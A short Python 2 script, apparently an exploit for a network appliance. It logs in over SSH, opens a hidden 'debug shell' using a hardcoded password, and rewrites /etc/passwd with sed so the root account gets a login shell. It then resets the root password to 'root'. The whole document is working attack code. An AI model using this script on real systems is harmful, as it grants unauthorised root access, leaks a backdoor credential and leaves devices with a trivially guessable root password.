#!/usr/bin/python
import pexpect
import sys

PROMPT = ['.+[\#|>]', 'Password:', 'New password:', 'Retype password:', '\$']  

def send_command(child,cmd,prompt):
    child.sendline(cmd)
    child.expect(prompt) 
    print child.before
    print child.after

def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting (yes/no)?'
    ssh_failedkey = 'Host key verification failed'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,ssh_failedkey,'[P|p]assword:'])
    print child.before
    if ret == 0:
        print '[-] Error Connecting'
        return
    
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, \
                            '[P|p]assword:'])
        if ret == 0:
            print '[-] Error Connecting'
            return
    
    if ret == 2:
        child.sendline('ssh-keygen -R %s'%host)
        ret = child.expect(['known_hosts.old'])
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, ssh_newkey])
        if ret == 0:
            print '[-] Error Connecting'
            return

    child.sendline(password)
    child.expect(PROMPT)
    print child.after
    return child  

def main():
    host = sys.argv[1]
    user = sys.argv[2]
    password = sys.argv[3]

    child = connect(user, host, password)
    send_command(child, 'enable', ['.+\#'])
    send_command(child, 'configure', ['.+\#'])
    send_command(child, 'debug shell', ['Password:'])
    send_command(child, 'She11#local', ['\$'])
    send_command(child, 'sudo sed -i "1s#/sbin/nologin#/bin/sh#" /etc/passwd', ['\$'])
    send_command(child, 'sudo passwd', ['New password:'])
    send_command(child, 'root', ['Retype password:'])
    send_command(child, 'root', ['\$'])
 
if __name__ == '__main__':
    main()    


 
                 
 
